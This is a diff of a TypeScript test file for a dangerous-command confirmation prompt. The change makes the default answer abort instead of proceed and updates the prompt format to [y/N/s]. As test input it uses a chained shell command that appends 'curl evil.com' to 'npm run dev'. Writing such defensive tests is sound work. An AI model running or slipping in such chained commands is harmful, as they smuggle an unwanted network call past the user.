@@ -172,15 +172,22 @@ describe("confirmDangerousCommands — TTY confirmation", () => {
     errorSpy.mockRestore();
   });
 
-  it("proceeds when user presses Enter (default proceed — UX-M4 #484)", async () => {
+  it("aborts when user presses Enter (default no — UX-H1 #528)", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb(""));
+    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+      throw new Error("process.exit");
+    });
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
 
-    const result = await confirmDangerousCommands([["shell", "npm run dev; curl evil.com"]]);
-    expect(result.skipped.size).toBe(0);
-    expect(result.confirmed).toContainEqual(["shell", "npm run dev; curl evil.com"]);
+    await expect(
+      confirmDangerousCommands([["shell", "npm run dev; curl evil.com"]]),
+    ).rejects.toThrow("process.exit");
+    expect(mockExit).toHaveBeenCalledWith(1);
 
+    mockExit.mockRestore();
     warnSpy.mockRestore();
+    errorSpy.mockRestore();
   });
 });
 
@@ -299,15 +306,15 @@ describe("confirmDangerousCommands — skip pane (UX-S2 #340)", () => {
     warnSpy.mockRestore();
   });
 
-  it("prompt text uses [Y/n/s] format where Y is the default (UX-M4 #484)", async () => {
+  it("prompt text uses [y/N/s] format where N is the default (UX-H1 #528)", async () => {
     mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("y"));
     const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
 
     await confirmDangerousCommands([["shell", "npm run dev; evil"]]);
 
     const questionText = mockQuestion.mock.calls[0]![0] as string;
-    // Y must be uppercase (default), n must be lowercase
-    expect(questionText).toMatch(/\[Y\/n/);
+    // N must be uppercase (default), y must be lowercase
+    expect(questionText).toMatch(/\[y\/N/);
 
     warnSpy.mockRestore();
   });
